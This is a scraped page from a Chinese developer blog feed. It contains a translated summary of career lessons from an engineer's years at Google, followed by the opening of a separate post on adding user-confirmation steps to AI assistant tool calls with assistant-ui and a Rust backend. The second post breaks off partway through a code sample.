<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c483fd6b4aa74b4186317d8c829a1b88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=LQZMyQWnmfBH6ZrvibTydlcIj5w%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">3. 行动优先，先做，再做对，再做好</h2>
<p>追求完美会让人停滞不前。</p>
<p>我曾经见过工程师花几周讨论一个从没建过的东西的理想架构。</p>
<p>但完美的方案很少从思考中产生，它都是从与现实的碰撞中产生。</p>
<p>先做出来，再做对，再做得更好。</p>
<p>把丑陋的原型放到用户面前，写出乱糟糟的技术文档初稿，发布那个让你有点尴尬的 MVP。</p>
<p>从真实反馈中学到的内容，哪怕只有一周，也远比一个月的理论辩论多得多。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d82bd7927bcb4cf183a4fcdaaa074fde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=XVirlg11MCKhRO%2BS2KBfWShI9D4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">4. 代码清晰远比炫技重要</h2>
<p>我知道你想要写出酷炫的代码，那可以证明自己很牛逼。</p>
<p>但项目往往不止你一个人，以后还有其他同事要维护。</p>
<p>优化时要考虑他们的理解能力，而不是你的代码是否优美。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4d3da1800184b7c8a5e5099b2c0b723~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=RY8mpLx4FCdi7bsSXrOwwDFstBw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4">5. 谨慎选择新技术</h2>
<p>新技术就像贷款，你要用 bug、招聘困难和认知负担来还。</p>
<p>关键不在于“永远不要创新”，而在于“只在因创新可以带来独特报酬的领域进行创新”。其他的一切还是应该回归平庸。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3295733131384836953973c979c1afd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=S9t7qFVYhOel1R8OCsCPHvI3ufI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">6. 你的代码不会替你说话，但人会</h2>
<p>刚开始工作时，我相信是金子总会发光。</p>
<p>但我错了。</p>
<p>代码静静地躺在仓库里。你的领导在会议上提到你，或者没提。同事推荐你参与项目，或者推荐了别人。</p>
<p>在大公司，决策是在你没被邀请的会议上做出的，用的是你没写的总结，由只有五分钟时间和十二件事要处理的人做出的。</p>
<p>如果你不在场时没人能清楚说出你的价值，那你的价值就等于可有可无。</p>
<p>这不是让你鼓吹自己，而是告诉你：<strong>你需要让你的价值被所有人看到。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbe0e9085fc445f49b73f06344b1b474~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=jvTmFyrGOMH9y9Gcp%2B0Y0bJXkqY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">7. 最好的代码是你根本不用写的代码</h2>
<p>工程师文化崇拜创造。</p>
<p>没有人会因为删除代码而获得晋升，即使删除代码往往比添加代码更能改进系统。</p>
<p><strong>因为你不写的每一行代码，都意味着你永远不必调试、维护或解释。</strong></p>
<p>在动工之前，先仔细思考一下：“如果我们不做这件事会发生什么？” 有时答案是“没什么坏处”，那就是你的解决方案。</p>
<p>问题不是工程师不会写代码，而是我们太会写了，以至于忘了问：该不该写？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d02dbcef4e8a4fc8ab901f6628d1273a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=erq6smwpVOatjhCG%2Ba0%2FPzVl29Q%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">8. 大规模时，连你的 bug 都有用户</h2>
<p>用户多的时候，连你的 bug 都会有用户，这产生了一个职业级洞察：</p>
<p>你不能把兼容性工作当“维护”，把新功能当“真正的工作”。兼容性就是产品。</p>
<p>所以把你的“废弃”做成“迁移”，带上时间、工具和同理心。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84b8588d72ec49e4b6ceba52bce5c73e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=zeIjsjdOORRowkviE2Ls%2BjsJhY0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">9. 慢实际上是因为不协调</h2>
<p>项目进展缓慢时，人们的第一反应往往是责怪执行：员工不够努力、技术不成熟、工程师人手不足。</p>
<p>但通常来说，这些都不是真正的问题所在。</p>
<p>在大公司，团队是并发执行的基本单位，但随着团队数量的增加，协调成本呈几何级增长。</p>
<p>大多数效率低下实际上源于目标不一致——人们在做错误的事情，或者以不兼容的方式做正确的事情。</p>
<p>所以高级工程师花更多时间澄清方向、接口和优先级，而不是“写代码更快”，那些才是真正的瓶颈所在。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7988d6032294a1ea4caf260b8750d48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=CDvKZO4GGyAmnSt6V0NCPeWcIXw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-9">10. 专注你能控制的，忽略你无法控制的</h2>
<p>在大公司，无数的变数都超出你的掌控——组织架构调整、管理决策、市场变化、产品转型等等。</p>
<p>过度关注这些因素只会让你焦虑不安，却又无能为力。</p>
<p>所以高效的工程师，会锁定自己的影响圈。你控制不了是否会重组，但你能控制工作质量、如何应对、学到什么。</p>
<p><strong>这并非被动接受，而是策略性关注。</strong></p>
<p><strong>把精力浪费在无法改变的事情上，就等于浪费了原本花在可以改变的事情上的精力。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e38ef618b7d44f379d08b57db8cfde6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=bFJwDcKzfUzZ%2F4zxTwFvVWV%2Fti8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">11. 抽象并不能消除复杂性</h2>
<p>每一次抽象都是一种赌博，赌你不需要理解下面是什么。</p>
<p>有时候你会赢，但总会有漏洞，一旦出现漏洞，你就需要清晰地知道你站在什么上面。</p>
<p><strong>所以高级工程师即使技术栈越来越高，也要持续学习“更底层”的东西。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fa41921c94b477d964e853845644e83~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=dTjZ57cH3cJpzJPh6kZjdc5PIX4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11">12. 写作让表达更清晰，以教带学是最快的学习方式</h2>
<p>写作能带来更清晰的表达。</p>
<p>当我向别人解释一个概念——在文档里、演讲中、代码评审评论里、甚至和 AI 聊天，我都会发现自己理解上的不足。</p>
<p>所以如果你觉得自己懂了什么，试着简单地解释它。卡住的地方，就是你理解肤浅的地方。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac9c956a64634a14baf6e05b39af7074~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=GTUCHe8KKeWZAuIP3FE5WZRkTJ0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">13. 注重粘合性工作</h2>
<p>粘合性工作——例如写文档、帮新人上手、跨团队协调、流程优化——至关重要。</p>
<p>但如果你总是无意识地做这些，反而可能会拖慢技术成长，把自己累垮。</p>
<p>陷阱在于把它当“乐于助人”的活动，而不是当作有边界的、刻意的、可见的影响力。</p>
<p>尝试给它设时限，轮换做，把它变成产出物：文档、模板、自动化。</p>
<p>让它作为“影响力”被看见，而不是作为“性格特点”。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05e19438a18b40f384baa7986f9e0c62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=jwch4rVz2LEh9Iwx3DMxPfpWT7s%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-13">14. 如果你赢得每一场辩论，你很可能是在积累无声的阻力</h2>
<p>当人们不再和你争，不是因为你说服了他们，而是因为他们放弃了。</p>
<p>但他们会在执行中表达分歧，而不是在会议上。</p>
<p>所以真正的共识需要更长时间。你得真正理解别人的观点，吸收反馈，有时候需要你当众改变主意。</p>
<p>短期“我是对的”的快感，远不如长期和心甘情愿的合作者一起建设的现实来得珍贵。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c8ba6fdb71774c5b8c8f53f59fae78bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=zoHM8ZrjQF9w8fES%2F0VmLoVOCAI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-14">15. 当衡量标准变成目标时，它就停止了衡量</h2>
<p>你暴露给管理层的每个指标，最终都会被博弈。</p>
<p>不是因为恶意，而是因为人会优化被度量的东西。</p>
<p>追如果你追踪代码行数，你会得到更多的代码行数。如果你追踪开发速度，你会得到过高的估算值。</p>
<p>高手的做法是：对每个指标请求都提供一对指标。一个用于衡量速度，一个用于衡量质量或风险。然后，坚持解读趋势，而不是盲目追求阈值。</p>
<p><strong>目标是洞察，而非监控。</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ec15462233a4ea9b077444f1dc1084f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=mRXQqxfH61RqVnoJrHnx%2FE0v2fQ%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-15">16. 承认自己不知道的事情比假装自己知道更能带来安全感</h2>
<p>资深工程师说“我不知道”并不是示弱——他们是在鼓励大家坦诚面对。</p>
<p>当领导者承认自己的不确定性时，就等于在暗示其他人也可以这样做。如果不这样的话，就会形成一种人人假装理解、问题被掩盖直到爆发的文化。</p>
<p>我见过团队里最资深的人从不承认自己不明白，我也见过由此造成的后果。问题不被问出来，假设不被挑战，初级工程师保持沉默因为他们以为别人都懂。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f639acec1964294b94686df33192abd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=1FljoZjwL9x0tvdkK4gZmP6s0WY%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-16">17. 你的人脉关系比你拥有的任何一份工作都更长久</h2>
<p>职业生涯早期，我专注于工作本身，忽视了人脉经营。回头看，这是个错误。</p>
<p>那些注重人脉关系的同事，在接下来的几十年里都受益匪浅。他们最先了解机会，更快地建立人脉，获得职位推荐，和多年来建立信任的人一起创业。</p>
<p>你的工作不会永远持续下去，但你的人脉网络却会一直存在。</p>
<p>以好奇心和慷慨的态度去拓展人脉，而不是抱着功利主义的心态。</p>
<p>当需要向前迈进的时候，往往是人际关系打开了这扇门。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c50cdff6218418ba3148878d0e3152f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=CQzTBDFgqE%2FbwlNGMkAswcmoRSA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-17">18. 大多数绩效的提升来自于减少工作量</h2>
<p>当系统变慢时，人们的第一反应往往是加东西：加缓存、并行处理、使用更智能的算法。</p>
<p>有时候这样做是对的。</p>
<p>但我发现，通过询问“我们计算了哪些不必要的东西？”往往能带来更多性能提升。</p>
<p><strong>删除不必要的工作几乎总是比更快地完成必要的工作更有成效。最快的代码是永远不会运行的代码。</strong></p>
<p>所以在进行优化之前，先问问自己这项工作是否真的应该存在。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc5dda96eea24a92b8f51fa34b806c0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=CWtYSECKp3V0Vwq98ER14VaDW2w%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-18">19. 流程存在的目的是为了减少不确定性，而不是为了留下书面记录</h2>
<p>最好的流程是让协调更容易、让失败成本更低。</p>
<p>最差的流程是官僚主义——它的存在不是为了帮忙，而是为了出事时推卸责任。</p>
<p>如果你无法解释一个个流程如何降低风险或提高清晰度，那么它很可能只是增加了额外开销。</p>
<p>如果人们花在记录工作上的时间比做工作的时间还多，那就说明出了大问题。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2da38824a55046bfac1a6e4ed5d1de2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=lIML3Mh4RsUVHRab%2BfytXloj%2BI0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-19">20. 最终，时间会比金钱更有价值</h2>
<p>刚开始工作的时候，你用时间换钱——这没问题。</p>
<p>但到了某个阶段，情况就完全不同了。你会开始意识到，时间才是不可再生资源。</p>
<p>我见过一些高级工程师为了晋升而累垮自己，只为了多拿几个百分点的薪酬。有些人确实升职了，但事后大多数人都在反思，自己放弃的一切是否值得。</p>
<p>答案不是“别努力工作”，而是“知道你在交易什么，并深思熟虑地进行交易”。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82971db1067549caa5f2ab4e869fc712~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=SJSPwqLcaClmWQc8lyh8iw1%2Birw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-20">21. 没有捷径，但有复利</h2>
<p>专业技能源于刻意练习——略微超越现有水平，然后不断反思，不断重复。年复一年，没有捷径可走。</p>
<p>但令人欣慰的是：学习的进步在于创造新的选择，而不仅仅是积累新的知识。</p>
<p>写作——不是为了吸引眼球，而是为了清晰表达。构建可复用的基础模型。将过往的经验总结成行动指南。</p>
<p>所以如果工程师把职业生涯看作是复利投资，而不是彩票，那么他最终往往会取得更大的成就。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbc39fec74084b4bb1da61680519ae77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=vFRMo2b8XJ0ERXUcS1jhPGpj35s%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-21">22. 最后</h2>
<p>21 条听起来很多，但它们可以归结为几个核心点：<strong>保持好奇，保持谦逊，记住工作始终是关于人的——你的用户、你的队友。</strong></p>
<p>工程师的职业生涯足够长，可以犯很多错误。我最钦佩的工程师，不是那些什么都做对的人——而是那些从错误中学习、分享发现、并坚持不懈的人。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7dabdf347a89449c82168d8b3874ea8e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595644&amp;x-signature=lOdCh9VYpkiMRREZKOHV7T%2FIGmE%3D" alt="" loading="lazy"/></p>
<p>本篇整理自<a href="https://link.juejin.cn?target=https%3A%2F%2Faddyosmani.com%2Fblog%2F21-lessons%2F%3Fref%3Ddailydev" target="_blank" title="https://addyosmani.com/blog/21-lessons/?ref=dailydev" ref="nofollow noopener noreferrer">《21 Lessons From 14 Years at Google》</a>，希望能帮助到你。</p>
<p>我是冴羽，10 年笔耕不辍，专注前端领域，更新了 10+ 系列、300+ 篇原创技术文章，翻译过 Svelte、Solid.js、TypeScript 文档，著有小册《Next.js 开发指南》、《Svelte 开发指南》、《Astro 实战指南》。</p>
<p>欢迎围观我的“<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">网页版朋友圈</a>”，关注我的公众号：<strong>冴羽（或搜索 yayujs）</strong>，每天分享前端知识、AI 干货。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[让 AI 学会"问一嘴"：assistant-ui 前端工具的人机交互实践]]></title>    <link>https://juejin.cn/post/7597276695403626537</link>    <guid>https://juejin.cn/post/7597276695403626537</guid>    <pubDate>2026-01-20T14:02:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597276695403626537" data-draft-id="7597253913248841769" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="让 AI 学会&quot;问一嘴&quot;：assistant-ui 前端工具的人机交互实践"/> <meta itemprop="keywords" content="前端,Rust,OpenAI"/> <meta itemprop="datePublished" content="2026-01-20T14:02:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="红尘散仙"/> <meta itemprop="url" content="https://juejin.cn/user/334694205359901"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            让 AI 学会"问一嘴"：assistant-ui 前端工具的人机交互实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/334694205359901/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    红尘散仙
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:02:05.000Z" title="Tue Jan 20 2026 14:02:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    32
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">让 AI 学会"问一嘴"：assistant-ui 前端工具的人机交互实践</h2>
<blockquote>
<p>🤖 当 AI 助手要帮用户执行敏感操作时，总不能闷头就干吧？得先问问人家确不确认啊！</p>
</blockquote>
<h3 data-id="heading-1">背景：一个"莽撞"的 AI 助手</h3>
<p>我在做一个工单管理系统，里面有个 AI 助手功能。用户可以说"帮我创建一个工单，数量 50"，AI 就会调用工具创建记录。</p>
<p>听起来很美好，但问题来了：</p>
<p><strong>AI 太"自信"了。</strong></p>
<p>它收到指令就直接执行，万一用户说错了呢？万一 AI 理解错了呢？50 变成 500，那可就麻烦了。</p>
<p>所以我需要一个机制：<strong>AI 调用工具前，先让用户确认一下。</strong></p>
<pre><code class="hljs language-less" lang="less">用户: 帮我创建一个工单，数量 <span class="hljs-number">50</span>

<span class="hljs-selector-tag">AI</span>: 好的，我来帮你创建记录
    ┌─────────────────────────┐
    │ 确认创建记录             │
    │ 名称: <span class="hljs-selector-tag">A</span> 款               │
    │ 数量: <span class="hljs-number">50</span>                 │
    │ <span class="hljs-selector-attr">[确认]</span>  <span class="hljs-selector-attr">[取消]</span>           │
    └─────────────────────────┘

用户: *点击确认*

<span class="hljs-selector-tag">AI</span>: ✅ 已创建记录：<span class="hljs-selector-tag">A</span> 款 <span class="hljs-selector-tag">x</span> <span class="hljs-number">50</span>
</code></pre>
<p>这就是所谓的 <strong>Human-in-the-Loop</strong>（人机协作）模式。</p>
<h3 data-id="heading-2">技术选型</h3>
<ul>
<li>前端：React + <code>@assistant-ui/react</code></li>
<li>后端：Rust + Axum + Rig（AI 框架）</li>
<li>AI：OpenAI GPT-4</li>
</ul>
<p><code>assistant-ui</code> 是一个专门为 AI 聊天界面设计的 React 组件库，它有个很棒的特性：<strong>前端工具（Frontend Tools）</strong>。</p>
<h3 data-id="heading-3">架构概览</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TB
    subgraph Frontend["前端 (React)"]
        Runtime[useChatRuntime]
        Tool[CreateRecordTool&lt;br/&gt;前端工具]
        UI[确认 UI]
        Runtime --&gt; Tool --&gt; UI
        UI --&gt;|resume| Tool
        Tool --&gt;|sendAutomatically| Runtime
    end

    subgraph Backend["后端 (Rust)"]
        Handler[Chat Handler]
        FTool[FrontendTool&lt;br/&gt;工具定义转发]
        AI[AI Model]
        Handler --&gt; FTool --&gt; AI
    end

    Runtime &lt;--&gt;|HTTP| Handler
</code></pre>
<h3 data-id="heading-4">核心概念：前端工具 vs 后端工具</h3>

























<table><thead><tr><th/><th>前端工具</th><th>后端工具</th></tr></thead><tbody><tr><td>执行位置</td><td>浏览器</td><td>服务器</td></tr><tr><td>能否与用户交互</td><td>✅ 可以</td><td>❌ 不行</td></tr><tr><td>适用场景</td><td>需要确认的操作</td><td>查询、计算</td></tr></tbody></table>
<p>前端工具的精髓在于：<strong>工具定义发给 AI，但执行在前端</strong>。</p>
<p>AI 知道有这个工具可以用，当它决定调用时，前端拦截执行，可以弹个确认框、让用户填个表单，用户操作完再把结果告诉 AI。</p>
<h3 data-id="heading-5">实现步骤</h3>
<h4 data-id="heading-6">1. 定义工具参数</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// schema.ts</span>
<span class="hljs-keyword">import</span> { z } <span class="hljs-keyword">from</span> <span class="hljs-string">"zod"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title class_">CreateRecordSchema</span> = z.<span class="hljs-title function_">object</span>({
  <span class="hljs-attr">name</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"名称"</span>),
